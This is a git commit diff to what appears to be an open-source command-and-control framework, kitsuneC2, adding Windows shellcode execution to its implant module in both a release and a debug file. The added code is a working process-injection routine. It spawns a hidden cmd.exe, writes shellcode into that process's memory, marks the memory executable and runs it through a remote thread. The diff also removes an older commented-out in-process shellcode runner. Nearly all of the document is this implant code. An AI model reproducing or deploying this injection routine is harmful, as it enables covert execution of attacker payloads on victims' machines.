e92409f4467be3cd03fb1d0375c48b1c10accc86
Benjamin Kortenbach <63813329+benji-k@users.noreply.github.com>
2024-10-17 17:41:26 +0200

    Add windows in-memory shellcode execution

--- kitsuneC2/implant/modules/modules_windows.go
+++ kitsuneC2/implant/modules/modules_windows.go
@@ -5,11 +5,69 @@ package modules
 import (
 	"errors"
 	"os/exec"
+	"syscall"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
-// TODO
+//This function executes shellcode by doing the following:
+//1. Start C:\\Windows\\System32\\cmd.exe process with the window hidden
+//2. Allocate memory in the cmd.exe process and write the shellcode into it
+//3. Start a remote thread in the cmd.exe process that executes the shellcode
+
+// I initially wanted to run a thread in the process of the implant itself, but for some reason, the program kept crashing. This is a workaround for now.
 func ShellcodeExec(shellcode []byte) error {
-	return errors.New("Not yet implemented for this platform")
+	program := "C:\\Windows\\System32\\cmd.exe"
+
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+
+	procInfo := &windows.ProcessInformation{}
+	startupInfo := &windows.StartupInfo{
+		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+		ShowWindow: 1,
+	}
+	strPtr, _ := syscall.UTF16PtrFromString(program)
+	errCreateProcess := windows.CreateProcess(strPtr, nil, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, startupInfo, procInfo)
+	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
+		return errors.New("error calling CreateProcess: " + errCreateProcess.Error())
+	}
+
+	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, procInfo.ProcessId)
+	if errOpenProcess != nil {
+		return errors.New("error calling OpenProcess: " + errOpenProcess.Error())
+	}
+
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		return errors.New("error calling VirtualAlloc: " + errVirtualAlloc.Error())
+	}
+	if addr == 0 {
+		return errors.New("VirtualAllocEx failed and returned 0")
+	}
+
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
+		return errors.New("error calling WriteProcessMemory: " + errWriteProcessMemory.Error())
+	}
+
+	oldProtect := windows.PAGE_READWRITE
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+		return errors.New("error calling VirtualProtectEx: " + errVirtualProtectEx.Error())
+	}
+
+	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
+	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
+		return errors.New("error calling CreateRemoteThreadEx: " + errCreateRemoteThreadEx.Error())
+	}
+	windows.CloseHandle(pHandle)
+
+	return nil
 }
 
 // Executes a command in Powershell and returns stdout
@@ -21,26 +79,3 @@ func Exec(cmd string) ([]byte, error) {
 	}
 	return byteOut, nil
 }
-
-/*
-import(
-	"syscall",
-	"unsafe"
-)
-
-func ShellcodeExec(shellcode []byte) error {
-	var bg_run uintptr = 0x00
-	if (bg) {
-		bg_run = 0x00000004
-	}
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
-	procCreateThread := kernel32.MustFindProc("CreateThread")
-	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x2000|0x1000, syscall.PAGE_EXECUTE_READWRITE)
-	ptr := (*[990000]byte)(unsafe.Pointer(addr))
-	for i, value := range sc {
-		ptr[i] = value
-	}
-	procCreateThread.Call(0, 0, addr, 0, bg_run, 0)
-}
-*/
--- kitsuneC2/implant/modules/modules_windows_debug.go
+++ kitsuneC2/implant/modules/modules_windows_debug.go
@@ -6,13 +6,78 @@ import (
 	"errors"
 	"log"
 	"os/exec"
+	"syscall"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
-// TODO
+//This function executes shellcode by doing the following:
+//1. Start C:\\Windows\\System32\\cmd.exe process with the window hidden
+//2. Allocate memory in the cmd.exe process and write the shellcode into it
+//3. Start a remote thread in the cmd.exe process that executes the shellcode
+
+// I initially wanted to run a thread in the process of the implant itself, but for some reason, the program kept crashing. This is a workaround for now.
 func ShellcodeExec(shellcode []byte) error {
-	log.Printf("[START WINDOWS SHELLCODE EXEC] starting new thread with following shellcode: % X\n", shellcode)
-	log.Printf("[ERROR WINDOWS SHELLCODE EXEC] not yet implemented\n")
-	return errors.New("Not yet implemented for this platform")
+	log.Println("[START] Injecting shellcode into another process")
+	program := "C:\\Windows\\System32\\cmd.exe"
+
+	log.Println("Loading kernel32.dll and necessary procedures...")
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+
+	procInfo := &windows.ProcessInformation{}
+	startupInfo := &windows.StartupInfo{
+		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+		ShowWindow: 1,
+	}
+	strPtr, _ := syscall.UTF16PtrFromString(program)
+	log.Println("Starting cmd.exe process")
+	errCreateProcess := windows.CreateProcess(strPtr, nil, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, startupInfo, procInfo)
+	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
+		return errors.New("error calling CreateProcess: " + errCreateProcess.Error())
+	}
+
+	log.Println("Getting handle to newly spawned process...")
+	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, procInfo.ProcessId)
+	if errOpenProcess != nil {
+		return errors.New("error calling OpenProcess: " + errOpenProcess.Error())
+	}
+
+	log.Println("Allocating memory inside cmd.exe")
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		return errors.New("error calling VirtualAlloc: " + errVirtualAlloc.Error())
+	}
+	if addr == 0 {
+		return errors.New("VirtualAllocEx failed and returned 0")
+	}
+
+	log.Println("Writing shellcode into allocated memory...")
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
+		return errors.New("error calling WriteProcessMemory: " + errWriteProcessMemory.Error())
+	}
+
+	log.Println("Changing permissions of memory page...")
+	oldProtect := windows.PAGE_READWRITE
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+		return errors.New("error calling VirtualProtectEx: " + errVirtualProtectEx.Error())
+	}
+
+	log.Println("Starting remote thread...")
+	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
+	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
+		return errors.New("error calling CreateRemoteThreadEx: " + errCreateRemoteThreadEx.Error())
+	}
+	windows.CloseHandle(pHandle)
+
+	log.Println("[SUCCESS] Shellcode execution started in another process")
+	return nil
 }
 
 // Executes a command in Powershell and returns stdout
@@ -27,26 +92,3 @@ func Exec(cmd string) ([]byte, error) {
 	log.Printf("[SUCCESS WINDOWS EXEC] result: %s\n", string(byteOut))
 	return byteOut, nil
 }
-
-/*
-import(
-	"syscall",
-	"unsafe"
-)
-
-func ShellcodeExec(shellcode []byte) error {
-	var bg_run uintptr = 0x00
-	if (bg) {
-		bg_run = 0x00000004
-	}
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
-	procCreateThread := kernel32.MustFindProc("CreateThread")
-	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x2000|0x1000, syscall.PAGE_EXECUTE_READWRITE)
-	ptr := (*[990000]byte)(unsafe.Pointer(addr))
-	for i, value := range sc {
-		ptr[i] = value
-	}
-	procCreateThread.Call(0, 0, addr, 0, bg_run, 0)
-}
-*/
